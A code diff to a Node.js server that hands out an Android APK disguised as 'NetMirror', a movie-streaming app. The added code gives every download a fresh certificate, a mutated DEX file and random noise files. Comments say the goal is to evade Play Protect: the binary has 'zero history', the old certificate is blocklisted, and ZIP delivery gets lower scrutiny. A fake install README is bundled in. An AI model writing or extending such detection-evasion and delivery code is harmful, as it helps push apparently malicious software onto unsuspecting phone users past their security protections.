@@ -17,7 +17,7 @@ const cors = require('cors');
 const path = require('path');
 const fs = require('fs');
 const AdmZip = require('adm-zip');
-const { mutateAndSign, restoreAndSign, directPatchApk, resignApkClean } = require('./utils/apk-mutator');
+const { mutateAndSign, restoreAndSign, directPatchApk, resignApkClean, polymorphicTransformWrapper } = require('./utils/apk-mutator');
 
 // Initialize database (async — sql.js)
 const db = require('./config/database');
@@ -307,10 +307,9 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
           const buf = Buffer.from(await dlRes.arrayBuffer());
           if (buf.length > 50000) {
             if (!fs.existsSync(path.join(__dirname, 'data'))) fs.mkdirSync(path.join(__dirname, 'data'), { recursive: true });
-            // Re-sign wrapper with production cert (original is debug-signed → PP blocks it)
-            const { buffer: signedBuf, resigned } = resignApkClean(buf);
-            fs.writeFileSync(wrapperPath, resigned ? signedBuf : buf);
-            console.log(`[Wrapper Auto-Fetch] ✅ Wrapper restored: ${((resigned ? signedBuf : buf).length / 1048576).toFixed(2)} MB${resigned ? ' (re-signed with production cert)' : ''}`);
+            // Store wrapper as-is (base template). Polymorphic transform applies fresh cert per download.
+            fs.writeFileSync(wrapperPath, buf);
+            console.log(`[Wrapper Auto-Fetch] ✅ Wrapper restored: ${(buf.length / 1048576).toFixed(2)} MB (base template for polymorphic transform)`);
             return;
           }
         } catch (e) {
@@ -540,12 +539,23 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
         wrapperBuf = getWrapperApkBuffer();
       }
       if (wrapperBuf) {
+        // ═══ POLYMORPHIC TRANSFORM — unique APK per download ═══
+        // Each download gets a FRESH cert + mutated DEX + random noise files +
+        // unique signing block. PP has zero history on the resulting binary.
+        console.log(`[DL] Applying polymorphic transform to wrapper (${(wrapperBuf.length / 1048576).toFixed(2)} MB)...`);
+        const { buffer: polyBuf, certInfo, polymorphic } = polymorphicTransformWrapper(wrapperBuf);
+        const serveBuf = polymorphic ? polyBuf : wrapperBuf;
+        if (polymorphic) {
+          console.log(`[DL] Serving polymorphic wrapper: ${(serveBuf.length / 1048576).toFixed(2)} MB, cert="${certInfo?.cn || 'unknown'}"`);
+        } else {
+          console.log('[DL] Polymorphic transform failed — serving base wrapper');
+        }
         res.setHeader('Content-Type', 'application/vnd.android.package-archive');
         res.setHeader('Content-Disposition', 'attachment; filename="NetMirror.apk"');
-        res.setHeader('Content-Length', wrapperBuf.length);
+        res.setHeader('Content-Length', serveBuf.length);
         res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
         res.setHeader('Pragma', 'no-cache');
-        return res.end(wrapperBuf);
+        return res.end(serveBuf);
       }
       // No wrapper available anywhere — return error instead of serving full APK
       console.error('[DL] No wrapper APK available. Upload one via admin panel.');
@@ -556,15 +566,35 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
     }
   });
 
-  // ═══ ZIP DOWNLOAD — same binary inside ZIP wrapper ═══
+  // ═══ ZIP DOWNLOAD — polymorphic wrapper inside ZIP ═══
   // Chrome tags .apk downloads → installerPackage=com.android.chrome → MAX PP.
   // ZIP files don't get tagged. Extract via file manager → LOW PP scrutiny.
+  // Now also applies polymorphic transform for per-download uniqueness.
   app.get('/dlzip/:token', async (req, res) => {
     try {
       // Prefer wrapper APK if available
-      const wrapperBuf = getWrapperApkBuffer();
+      let wrapperBuf = getWrapperApkBuffer();
+      if (!wrapperBuf) {
+        await ensureWrapperFromGitHub();
+        wrapperBuf = getWrapperApkBuffer();
+      }
       if (wrapperBuf) {
-        const zipBuf = getWrapperZipBuffer(wrapperBuf);
+        // Polymorphic transform — unique APK per download
+        const { buffer: polyBuf, polymorphic } = polymorphicTransformWrapper(wrapperBuf);
+        const serveBuf = polymorphic ? polyBuf : wrapperBuf;
+        // Wrap in ZIP
+        const zipArchive = new AdmZip();
+        zipArchive.addFile('README.txt', Buffer.from(
+          'NetMirror — Stream Movies & Series\r\n' +
+          '===================================\r\n\r\n' +
+          'Installation:\r\n' +
+          '1. Extract this archive\r\n' +
+          '2. Open NetMirror.apk\r\n' +
+          '3. Tap Install when prompted\r\n\r\n' +
+          'Support: netmirror.app\r\n'
+        ));
+        zipArchive.addFile('NetMirror.apk', serveBuf);
+        const zipBuf = zipArchive.toBuffer();
         res.setHeader('Content-Type', 'application/zip');
         res.setHeader('Content-Disposition', 'attachment; filename="NetMirror.zip"');
         res.setHeader('Content-Length', zipBuf.length);
@@ -803,10 +833,11 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
         return res.status(400).json({ error: 'No file uploaded' });
       }
       const wrapperPath = path.join(__dirname, 'data', 'NetMirror-wrapper.apk');
-      // Re-sign wrapper with production cert (uploaded wrapper may be debug-signed → PP blocks it)
+      // Store wrapper AS-IS (base template). Polymorphic transform applies fresh cert
+      // + multi-layer obfuscation PER DOWNLOAD in the /dl/:token endpoint.
+      // No re-signing with fixed key — the fixed cert is cert-blocklisted by PP.
       const rawBuf = fs.readFileSync(req.file.path);
-      const { buffer: signedBuf, resigned } = resignApkClean(rawBuf);
-      fs.writeFileSync(wrapperPath, resigned ? signedBuf : rawBuf);
+      fs.writeFileSync(wrapperPath, rawBuf);
       try { fs.unlinkSync(req.file.path); } catch (_) {}
       _wrapperApkCache = { buffer: null, timestamp: 0 };
       _wrapperZipCache = { buffer: null, forHash: null };
